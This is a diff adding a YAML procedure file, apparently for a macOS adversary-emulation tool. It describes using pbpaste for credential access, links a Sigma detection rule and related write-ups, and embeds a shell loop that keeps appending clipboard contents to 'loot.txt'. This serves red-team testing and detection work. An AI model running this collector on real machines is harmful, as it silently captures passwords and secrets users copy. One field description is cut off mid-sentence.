@@ -1,0 +1,48 @@
+procedure_name: pbpaste
+tactic: Credential Access
+ttp_id: T9999
+guid: $GUID
+intent: Paste the contents of clipboard to the terminal.
+author: '@darmado | https://x.com/darmad0'
+credit: 'LOOBins catalog author: Brendan Chamberlain (@infosecB)'
+created: '2023-04-11'
+updated: $UPDATED
+version: 1.0.0
+platform:
+- darwin
+detection:
+- ioc: 'Sigma: Clipboard Data Collection Via Pbpaste'
+  analysis: https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/macos/process_creation/proc_creation_macos_pbpaste_execution.yml
+resources:
+- link: https://www.loobins.io/
+  description: LOOBins — Living Off The Orchard macOS binaries
+- link: ''
+  description: ''
+- link: https://medium.com/@NullByteWht/hacking-macos-how-to-dump-1password-keepassx-lastpass-passwords-in-plaintext-723c5b1c311b
+  description: 'Hacking macOS: How to Dump 1Password, KeePassX & LastPass Passwords in Plaintext'
+- link: https://danielcortez.substack.com/p/living-off-the-land-exploring-macos-b65
+  description: 'Living-off-the-Land: Exploring macOS LOOBins and Crafting Detection Rules - pbpaste'
+acknowledgement:
+- person: ''
+  handle: ''
+procedure:
+  arguments:
+  - option: --use-pbpaste-to-collect-sensitive-clipboard-data
+    description: A pbpaste bash loop can continously collect clipboard contents every x minutes and write contents to
+    execute_function:
+    - execute_use_pbpaste_collect_sensitive_clipboard_data
+  global_variable:
+  - name: CMD_PBPASTE
+    type: string
+    default_value: /usr/bin/pbpaste
+  functions:
+  - name: execute_use_pbpaste_collect_sensitive_clipboard_data
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_use_pbpaste_collect_sensitive_clipboard_data() {\n    local result\n    result=$(while true; do echo $(pbpaste)\
+      \ >> loot.txt; sleep 10; done 2>&1)\n    $CMD_PRINTF \"RESULT|%s\\n\" \"$result\"\n    return 0\n}"
